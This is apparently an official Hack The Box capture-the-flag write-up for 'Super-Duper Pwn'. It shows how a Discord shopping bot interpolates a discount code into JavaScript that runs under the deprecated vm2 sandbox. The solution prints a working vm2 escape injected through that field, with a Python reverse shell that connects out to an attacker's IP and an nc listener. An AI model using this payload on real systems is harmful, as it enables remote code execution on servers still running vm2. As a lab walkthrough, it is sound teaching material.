![](../../../../../assets/logo_htb.png)



<img src="../../../../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />    	<font size="10">Super-Duper Pwn</font>

​		17<sup>th</sup> April 2024

​		Prepared By: ir0nstone

​		Challenge Author(s): Lean

​		Difficulty: <font color=green>Easy</font>

​		Classification: Official

 



# Synopsis

Super-Duper Pwn is an Easy misc challenge that simply requires a user to abuse a discord bot to achieve code execution, bypassing a vm2 restricted environment.

# Description

In the heart of the desolate wasteland stood a relic of the old world: the last known Super Duper Mart still operational, run entirely by a swarm of self-service robots. Designed as an impenetrable fortress, it preserved food and drinks from a long-gone era. The only interaction with the outside world came from behind a titanium-barred window, where a prototype Bag Boy robot sporadically chirped, "How may I be of assistance today?". For the crew, this store was a beacon of hope amidst the ruins, holding the nuclear goodies they desperately needed for their perilous journey. Short on caps, their only option was to somehow hack the robot. (https://discord.com/oauth2/authorize?client_id=1235600871086358649&scope=bot&permissions=2048)

## Skills Required

- JS Source Analysis

## Skills Learned

- Bypassing a sandboxed environment

# Enumeration
If we follow the link, we can add a discord bot named **SD Shopping Assistant** to a server of our choice. Creating a personal server and inviting it, we can see 4 different functionalities. A combination of discord and source code analysis can tell us what these options do. We can see that there are two containers, one named `bot` and another named `api`.

* `/listproducts` - prints out the available products
* `/addtocart [id] [quantity]` - adds `quantity` of product ID `id` to the cart
* `/viewcart` - prints out the cart contents
* `/checkout [discount]` - checks out and returns the total cost; initially, we are not able to use this as we are not "logged in"

`/listproducts` and `/viewcart` are not too interesting, as they take no additional input, so we focus on `/addtocart` and `/checkout`.

`/addtocart` is very basic:

```js
if (commandName === "addtocart") {
    const id = interaction.options.getString("id");
    const quantity = interaction.options.getInteger("quantity");

    const product = products.find(p => p.id === id);

    if (!product) {
        await interaction.reply("Product not found.");
        return;
    }

    if (!carts[interaction.user.id]) {
        carts[interaction.user.id] = [];
    }

    carts[interaction.user.id].push({ product, quantity });

    await interaction.reply(`${quantity}x ${product.name} added to your cart.`);
}
```

Nothing out of the ordinary there - at least, not compared to `/checkout`:

```js
if (commandName === "checkout") {
    if (!interaction.member.roles.cache.some(role => role.name === 'Loggedin')) {
        await interaction.reply("You don't have permission to use this command.");
        return;
    }

    const cart = carts[interaction.user.id] || [];
    if (cart.length === 0) {
        await interaction.reply("Your cart is empty.");
        return;
    }

    const discountCode = interaction.options.getString("discount");

    const definitions = `
        const discountCodes = {
            "DISCOUNT10": 0.10,
            "DISCOUNT20": 0.20,
            "DISCOUNT30": 0.30
        };
        let cart = ${JSON.stringify(cart)}; 
        let discountCode = '${discountCode}'; 
        let discount = 0;
    `;
    const code = `
        if (discountCode && discountCodes[discountCode]) {
            discount = discountCodes[discountCode];
        }
        
        let total = 0;
        cart.forEach(item => {
            total += item.product.price * item.quantity;
        });
        total *= (1 - discount);
        total;
    `;
    const output = await evaluateCode(definitions + code);

    await interaction.reply(`Your total is ${output} caps`);
    carts[interaction.user.id] = [];
}
```

Firstly, we can note why we are not logged in - we don't have a role by the name of `Loggedin` assigned to us. We can create that in the server settings and give ourselves it; now we can run `/checkout`.

Next, the function builds up JavaScript code by combining a boilerplate with our `discount` input, which is stored in the `discountCode` variable and inserted directly into the string. It will eventually run `evaluateCode` on it:

```js
const evaluateCode = async (code) => {
    try {
        const response = await axios.post("http://api:3000/run", { code });
        return JSON.stringify(response.data.output);
    } catch (error) {
        return error.message;
    }
}
```

This sends the `code` to the `/run` endpoint of the API container, which does the following:

```js
app.post("/run", (req, res) => {
    let { code } = req.body;
    
    if (typeof code !== "string") {
        return res.status(400).json({ error: "Code must be a string." });
    }

    const vm = new VM();

    try {
        let output = vm.run(code);
        res.json({ output });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});
```

It executes the code! This is incredibly unsafe, as there is user-controlled code here - an attacker could run arbitrary code! The only saving grace is that this is being run under a `VM` instance from the [`vm2`](https://www.npmjs.com/package/vm2) package, but this package has been **deprecated**!


# Solution
All we have to do is craft a vm2 bypass that will provide us with a reverse shell. We will grab a vm2 bypass from [here](https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9) and craft a payload:

```
';const ip = "<ip>";
const port = 9001;
const revshell = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`;
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor("return process")().mainModule.require("child_process").execSync(revshell); }
            )
        }
    }
};
p.then();let a = '
```

Note that `';` at the beginning and `;let a = '` at the end - this is so that when `discountCode` is inserted into the JS code, it remains valid code. Set `ip` to a machine you have control over and then listen on it. Make sure the machine is publicly accessible!

```sh
nc -nvlp 9001
```

Now send the payload in discord, using `/checkout <payload>` (newlines don't matter). We should get a callback on the listener, and we can run `/readflag` to get the flag:

```sh
user@server:~$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 16.16.97.171 51076
$ /readflag
/readflag
HTB{<flag>}
```
